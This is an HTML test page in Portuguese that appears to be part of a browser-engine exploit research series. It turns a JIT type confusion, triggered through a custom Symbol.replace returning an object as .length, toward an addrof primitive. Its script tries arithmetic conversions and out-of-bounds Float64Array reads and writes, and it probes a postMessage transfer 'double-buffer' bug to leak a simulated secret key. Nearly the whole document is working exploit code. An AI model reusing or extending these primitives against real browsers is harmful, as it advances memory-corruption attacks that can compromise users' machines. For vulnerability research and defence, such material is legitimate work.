<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>TEST 41 - addrof: Aritmética no JSValue Bruto + Double-Buffer</title></head>
<body>
<h2>TEST 41 — addrof: Operação Aritmética no JSValue + Explorar Double-Buffer</h2>

<p><b>Achados que motivam este teste:</b></p>
<ul>
  <li><b>40-C:</b> <code>strLen(confused)</code> retornou o objeto <code>victim</code> diretamente
      quando <code>.length = victim</code>. JIT não converteu para número — retornou JSValue bruto.</li>
  <li><b>40-D:</b> <code>postMessage(ciclico + [buf])</code> → remetente: <code>buf.byteLength=0</code>,
      receptor: <code>buf.byteLength=262144</code> com dados. <b>Double-buffer</b>: motor copiou
      E marcou como transferido.</li>
</ul>

<p><b>Sub-testes:</b></p>
<ul>
  <li><b>41-A</b> Aplicar operação aritmética no retorno do JIT antes da deopt:
      <code>strLen(confused) + 0</code>, <code>strLen(confused) | 0</code>,
      <code>strLen(confused) * 1.0</code> — alguma converte JSValue para double?</li>
  <li><b>41-B</b> Encadear resultado do JIT como índice de TypedArray:
      <code>f64[strLen(confused)]</code> — se JIT usa o JSValue como índice antes de verificar tipo</li>
  <li><b>41-C</b> Double-buffer: modificar o buffer no receptor e verificar se o remetente observa</li>
  <li><b>41-D</b> Double-buffer: enviar buffer secreto em objeto cíclico — receptor obtém cópia</li>
</ul>

<pre id="log">Pronto. Execute A → B → C → D.</pre>
<button onclick="runA()">41-A: ARITMÉTICA NO JSValue</button>
<button onclick="runB()">41-B: JSValue COMO ÍNDICE</button>
<button onclick="runC()">41-C: DOUBLE-BUFFER SYNC</button>
<button onclick="runD()">41-D: BUFFER SECRETO LEAK</button>

<script>
var log = document.getElementById('log');
function info(m)   { log.textContent += '\n[INFO] ' + m; }
function alerta(m) { log.textContent += '\n\n⚠ ALERTA: ' + m + '\n'; }
function ok(m)     { log.textContent += '\n[OK]   ' + m; }
function sep()     { log.textContent += '\n' + '-'.repeat(60); }

function forceGC() {
  var t=[]; for(var i=0;i<80000;i++) t.push({x:i,b:new Uint8Array(4)}); t=null;
}
function f64bits(val) {
  var buf = new ArrayBuffer(8); new Float64Array(buf)[0] = val;
  var u32 = new Uint32Array(buf);
  return '0x'+u32[1].toString(16).padStart(8,'0')+'_'+u32[0].toString(16).padStart(8,'0');
}
// Ponteiro válido: não é NaN canônico, não é 0, não é double normal <1024
function looksLikePtr(v) {
  if(typeof v !== 'number' || isNaN(v) || !isFinite(v)) return false;
  var buf = new ArrayBuffer(8); new Float64Array(buf)[0] = v;
  var u32 = new Uint32Array(buf);
  var hi = u32[1], lo = u32[0];
  if(hi === 0x7ff80000 && lo === 0) return false; // NaN canônico JSC
  if(hi === 0 && lo === 0) return false;           // zero
  // Double normal: exponent em [0x3FF, 0x409] cobre 0.5..1024 — não é ponteiro
  var exp = (hi >>> 20) & 0x7FF;
  if(exp >= 0x3FE && exp <= 0x409) return false;
  return true; // qualquer outro padrão de bits é suspeito
}

// ─── Construtor do primitivo Symbol.replace (confirmado em 40-C) ───────────
function buildSymbolReplaceJIT(phaseRef, victimRef) {
  var callCount = 0;
  var pattern = {
    [Symbol.replace]: function(str) {
      callCount++;
      if(phaseRef[0] === 'warmup') return str;
      // Ataque: .length = victim (objeto)
      return {
        toString: function() { return str; },
        valueOf:  function() { return str; },
        length:   victimRef[0],
        0: str[0]||'x'
      };
    }
  };
  return { pattern: pattern, getCount: function(){ return callCount; } };
}

// ─── 41-A ─────────────────────────────────────────────────────────────────
function runA() {
  log.textContent = '[TEST 41-A] Operação aritmética no retorno JIT antes da deopt...\n';
  sep();
  info('40-C: strLen retornou o objeto quando .length=victim.');
  info('Se aplicarmos aritmética INLINE na função JIT, o motor pode converter JSValue→double\n');
  info('antes de verificar o tipo do retorno de strLen.\n');

  var victim = {
    magic:    0xDEADC0DE,
    sentinel: 1.337e100,
    name:     'arith_victim_41A'
  };

  var phase = ['warmup'];
  var victimRef = [victim];
  var built = buildSymbolReplaceJIT(phase, victimRef);
  var pat = built.pattern;

  // Funções JIT com operação INLINE — o JIT deve compilar toda a expressão
  function strLenPlusZero(s)     { return s.replace(pat,'').length + 0; }
  function strLenOrZero(s)       { return s.replace(pat,'').length | 0; }
  function strLenMulOne(s)       { return s.replace(pat,'').length * 1; }
  function strLenPlusOne(s)      { return s.replace(pat,'').length + 1; }
  function strLenSubZero(s)      { return s.replace(pat,'').length - 0; }
  function strLenToFixed(s)      { var r=s.replace(pat,''); return r.length.toFixed ? r.length.toFixed(0) : '?'; }
  function strLenBitwiseNot(s)   { return ~s.replace(pat,'').length; }
  function strLenRightShift(s)   { return s.replace(pat,'').length >>> 0; }

  var fns = [
    { name: 'length + 0',      fn: strLenPlusZero    },
    { name: 'length | 0',      fn: strLenOrZero      },
    { name: 'length * 1',      fn: strLenMulOne      },
    { name: 'length + 1',      fn: strLenPlusOne     },
    { name: 'length - 0',      fn: strLenSubZero     },
    { name: '~length',         fn: strLenBitwiseNot  },
    { name: 'length >>> 0',    fn: strLenRightShift  },
  ];

  var base = 'hello world test string XYZ';

  info('Aquecendo todas as funções (50k calls cada)...');
  phase[0] = 'warmup';
  for(var w = 0; w < 50000; w++) {
    fns.forEach(function(f) { f.fn(base); });
  }
  info('Warmup completo.');
  sep();

  // Fase de ataque
  phase[0] = 'attack';
  info('Fase de ataque: .length = victim object\n');

  fns.forEach(function(f) {
    try {
      var r = f.fn(base);
      var t = typeof r;
      info(f.name + ' → ' + r + ' | typeof=' + t);

      if(t === 'number') {
        var bits = f64bits(r);
        info('  bits: ' + bits);
        if(looksLikePtr(r)) {
          alerta('POTENCIAL ADDROF: ' + f.name + ' = ' + r + '\n' +
                 'bits: ' + bits + '\n' +
                 'Operação aritmética sobre JSValue de victim converteu para double suspeito!');
        }
      } else if(t === 'object') {
        if(r === victim) {
          info('  → retornou victim diretamente (sem conversão)');
        }
      } else if(t === 'string') {
        info('  → string: "' + r + '"');
      }
    } catch(e) {
      alerta('EXCECAO em ' + f.name + ': ' + e.message + ' — operação aritmética em objeto causou crash!');
    }
  });

  sep();
  // Tentar encadear: resultado de length como operando de Math.*
  info('\nVariante: Math.floor/ceil/round no length...');
  function strLenMathFloor(s) { return Math.floor(s.replace(pat,'').length); }
  function strLenMathAbs(s)   { return Math.abs(s.replace(pat,'').length); }
  function strLenMathSqrt(s)  { return Math.sqrt(s.replace(pat,'').length); }

  phase[0] = 'warmup';
  for(var w2 = 0; w2 < 50000; w2++) {
    strLenMathFloor(base); strLenMathAbs(base); strLenMathSqrt(base);
  }
  phase[0] = 'attack';
  info('Warmup Math.* completo. Fase de ataque:');
  [
    { name: 'Math.floor(length)', fn: strLenMathFloor },
    { name: 'Math.abs(length)',   fn: strLenMathAbs   },
    { name: 'Math.sqrt(length)',  fn: strLenMathSqrt  },
  ].forEach(function(f) {
    try {
      var r = f.fn(base);
      info(f.name + ' → ' + r + ' typeof=' + typeof r + (typeof r==='number' ? ' bits='+f64bits(r) : ''));
      if(typeof r === 'number' && looksLikePtr(r)) {
        alerta('ADDROF via ' + f.name + ': bits=' + f64bits(r));
      }
    } catch(e) {
      alerta('EXCECAO ' + f.name + ': ' + e.message);
    }
  });
}

// ─── 41-B ─────────────────────────────────────────────────────────────────
function runB() {
  log.textContent = '[TEST 41-B] JSValue como índice de TypedArray...\n';
  sep();
  info('Se strLen(confused) retorna o objeto (JSValue bruto),');
  info('usar esse valor como ÍNDICE em Float64Array pode fazer o JIT');
  info('converter o JSValue para inteiro — e esse inteiro pode ser o endereço.\n');

  var victim = {
    magic: 0xBEEFC0DE,
    name:  'typedarray_idx_victim'
  };
  var phase = ['warmup'];
  var victimRef = [victim];
  var built = buildSymbolReplaceJIT(phase, victimRef);
  var pat = built.pattern;

  // Float64Array alvo — queremos indexar com o JSValue de victim
  var targetF64 = new Float64Array(0x100000); // 1M elementos = 8MB
  for(var i = 0; i < 16; i++) targetF64[i] = i * 13.37; // primeiros 16 com valores conhecidos

  // Função JIT que usa .length como índice
  function readViaLength(s, arr) {
    var idx = s.replace(pat,'').length;
    return arr[idx];  // índice calculado do length
  }
  function writeViaLength(s, arr, val) {
    var idx = s.replace(pat,'').length;
    arr[idx] = val;   // escrita via índice do length
    return arr[idx];
  }

  var base = 'probe_string_for_idx';

  info('Aquecendo readViaLength/writeViaLength (50k calls)...');
  phase[0] = 'warmup';
  for(var w = 0; w < 50000; w++) {
    readViaLength(base, targetF64);
    writeViaLength(base, targetF64, 0.0);
  }
  info('Warmup completo. base.length=' + base.length);
  sep();

  // Fase ataque: length = victim object
  phase[0] = 'attack';
  info('Fase de ataque: .length = victim object\n');

  // Leitura: qual índice o JIT usa?
  try {
    var readResult = readViaLength(base, targetF64);
    info('readViaLength com .length=victim: ' + readResult + ' typeof=' + typeof readResult);
    if(typeof readResult === 'number' && readResult !== undefined) {
      info('bits: ' + f64bits(readResult));
      if(looksLikePtr(readResult)) {
        alerta('OOB READ via length como índice: readResult=' + readResult +
               '\nbits=' + f64bits(readResult) +
               '\nO JIT converteu o JSValue de victim para índice e leu targetF64[X]!');
      } else if(readResult === 0.0 || isNaN(readResult)) {
        info('Retornou 0 ou NaN — índice pode ser 0 ou fora dos limites');
      }
    } else if(typeof readResult === 'undefined') {
      info('Retornou undefined — índice fora dos limites (sugere JSValue → número grande)');
      alerta('readViaLength retornou undefined: o JSValue de victim foi interpretado como índice GIGANTE (>=1M) — o motor tentou acessar targetF64 fora dos limites!');
    } else if(typeof readResult === 'object') {
      ok('JIT deoptimizou e retornou objeto. Índice não usado como número.');
    }
  } catch(e) {
    alerta('EXCECAO em readViaLength: ' + e.message + ' — crash ao usar JSValue como índice!');
  }

  // Escrita: o JIT tenta escrever?
  try {
    var WRITE_SENTINEL = 987654321.0;
    var writeResult = writeViaLength(base, targetF64, WRITE_SENTINEL);
    info('\nwriteViaLength com .length=victim, valor=' + WRITE_SENTINEL + ': ' + writeResult);
    if(typeof writeResult === 'number' && writeResult === WRITE_SENTINEL) {
      alerta('OOB WRITE via length como índice: escrita de ' + WRITE_SENTINEL +
             ' retornou o mesmo valor — escrita confirmada em posição determinada pelo JSValue!');
    }
  } catch(e) {
    alerta('EXCECAO em writeViaLength: ' + e.message);
  }
}

// ─── 41-C ─────────────────────────────────────────────────────────────────
var receivedBufs = []; // buffers recebidos via onmessage

window.onmessage = function(e) {
  var obj = e.data;
  if(!obj || typeof obj !== 'object') return;

  info('[onmessage] recebeu objeto id=' + obj.id);

  // Registrar buffers recebidos para 41-C
  if(obj.buf instanceof ArrayBuffer && obj.buf.byteLength > 0) {
    receivedBufs.push({ obj: obj, buf: obj.buf });
    info('[onmessage] buf registrado: byteLength=' + obj.buf.byteLength);

    // Modificar o buffer recebido
    var view = new Uint32Array(obj.buf);
    var OLD = view[0];
    view[0] = 0xC0FFEE42; // novo valor
    info('[onmessage] Modificou buf[0]: 0x' + OLD.toString(16) + ' → 0xC0FFEE42');
    info('[onmessage] Verificando se remetente observa...');
    // (a verificação real acontece no runC após um delay)
  }
};

function runC() {
  log.textContent = '[TEST 41-C] Double-buffer sync: modificar no receptor, remetente vê?\n';
  sep();
  info('40-D confirmou: quando buf está em objeto cíclico, receptor recebe CÓPIA com dados.');
  info('Questão: se o receptor modifica a cópia, o remetente observa a mudança?\n');
  info('(Se sim → buffers compartilham memória = double-map grave)\n');

  var localBuf = new ArrayBuffer(1024);
  var localView = new Uint32Array(localBuf);
  localView[0] = 0xAAAAAAAA;
  localView[1] = 0xBBBBBBBB;

  info('localView[0] antes: 0x' + localView[0].toString(16));
  info('Enviando com transfer...');

  var cyclic = { id: 'sync_test', buf: localBuf, self: null };
  cyclic.self = cyclic;

  try {
    postMessage(cyclic, '*', [localBuf]);
    info('Enviado. localBuf.byteLength=' + localBuf.byteLength);
  } catch(e) {
    ok('postMessage lançou: ' + e.message);
    return;
  }

  // Aguardar onmessage modificar o buffer, depois verificar
  setTimeout(function() {
    info('\n[após 500ms] Verificando localView[0]...');
    if(localBuf.byteLength === 0) {
      try {
        var v = localView[0];
        info('localView[0] = ' + v);
        if(v === 0xC0FFEE42) {
          alerta('DOUBLE-MAP CONFIRMADO: receptor modificou 0xC0FFEE42 e remetente VIU a mudança!\n' +
                 'Os dois buffers compartilham a mesma página de memória física!');
        } else if(v === undefined) {
          ok('localView[0] = undefined (buffer zerado, sem acesso)');
        } else {
          info('localView[0] = 0x' + (v>>>0).toString(16) + ' (sem mudança ou valor inesperado)');
        }
      } catch(ex) {
        info('localView[0] lançou: ' + ex.message);
      }
    } else {
      info('localBuf.byteLength=' + localBuf.byteLength + ' (não foi zerado?)');
    }
  }, 500);
}

function runD() {
  log.textContent = '[TEST 41-D] Enviar buffer "secreto" via ciclo — receptor obtém cópia completa?\n';
  sep();
  info('Implicação de segurança do double-buffer:');
  info('Se uma mensagem contém dados sensíveis em um ArrayBuffer dentro de um objeto cíclico,');
  info('o receptor SEMPRE recebe uma cópia completa mesmo se o remetente');
  info('colocar o buffer na lista de transfer (pensando que vai zerrá-lo).\n');

  // Simular "dados secretos" — chave criptográfica, token, etc.
  var secretBuf  = new ArrayBuffer(256);
  var secretView = new Uint32Array(secretBuf);
  // Preencher com "chave secreta"
  var SECRET_KEY = [0x4B455931, 0x5345435F, 0x4B455932, 0x5345435F,
                    0xDEADC0DE, 0xCAFEBABE, 0x13371337, 0xBEEFBEEF];
  SECRET_KEY.forEach(function(v, i) { secretView[i] = v; });

  info('Buffer "secreto" criado: [' + SECRET_KEY.map(function(v){return'0x'+v.toString(16);}).join(', ') + ']');

  var cyclic = {
    id:     'secret_transfer',
    secret: secretBuf,
    self:   null
  };
  cyclic.self = cyclic;

  info('\nsecretBuf.byteLength antes: ' + secretBuf.byteLength);
  info('Enviando postMessage(ciclico, *, [secretBuf])...');
  info('Remetente ESPERA que secretBuf seja zerado (byteLength=0) após o send.\n');

  var receivedSecret = null;
  var prevOnmessage = window.onmessage;
  window.onmessage = function(e) {
    var obj = e.data;
    if(!obj || typeof obj !== 'object' || obj.id !== 'secret_transfer') {
      if(prevOnmessage) prevOnmessage(e);
      return;
    }
    receivedSecret = obj;
    info('[onmessage] Objeto recebido: id=' + obj.id);
    if(obj.secret instanceof ArrayBuffer) {
      var recvView = new Uint32Array(obj.secret);
      var leakedKey = [];
      for(var i = 0; i < Math.min(8, recvView.length); i++) {
        leakedKey.push('0x' + recvView[i].toString(16));
      }
      info('[onmessage] secret.byteLength=' + obj.secret.byteLength);
      info('[onmessage] Conteudo: [' + leakedKey.join(', ') + ']');

      var isOriginalKey = leakedKey[0] === '0x4b455931' && leakedKey[4] === '0xdeadc0de';
      if(isOriginalKey && obj.secret.byteLength === 256) {
        alerta('[onmessage] BUFFER SECRETO VAZOU COMPLETO!\n' +
               'byteLength=' + obj.secret.byteLength + '\n' +
               'Chave: [' + leakedKey.join(', ') + ']\n' +
               'O remetente acreditava ter transferido (zerado) o buffer,\n' +
               'mas o receptor recebeu todos os 256 bytes com os dados originais!\n' +
               'IMPACTO: qualquer dado em ArrayBuffer dentro de objeto cíclico\n' +
               'pode ser lido pelo receptor mesmo após "transfer" pelo remetente.');
      }
    }
  };

  try {
    postMessage(cyclic, '*', [secretBuf]);
    info('Enviado. secretBuf.byteLength=' + secretBuf.byteLength);
    if(secretBuf.byteLength === 0) {
      alerta('secretBuf ZERADO no remetente (byteLength=0).\n' +
             'Remetente: acredita que dados foram transferidos e estão inacessíveis.\n' +
             'Aguardando onmessage para verificar se receptor recebeu os dados...');
    } else {
      info('secretBuf.byteLength=' + secretBuf.byteLength + ' (não foi zerado — transfer falhou)');
    }
  } catch(e) {
    ok('postMessage lançou: ' + e.message);
  }

  info('\nAguardando onmessage com os dados do secretBuf...');
}
</script>
</body>
</html>

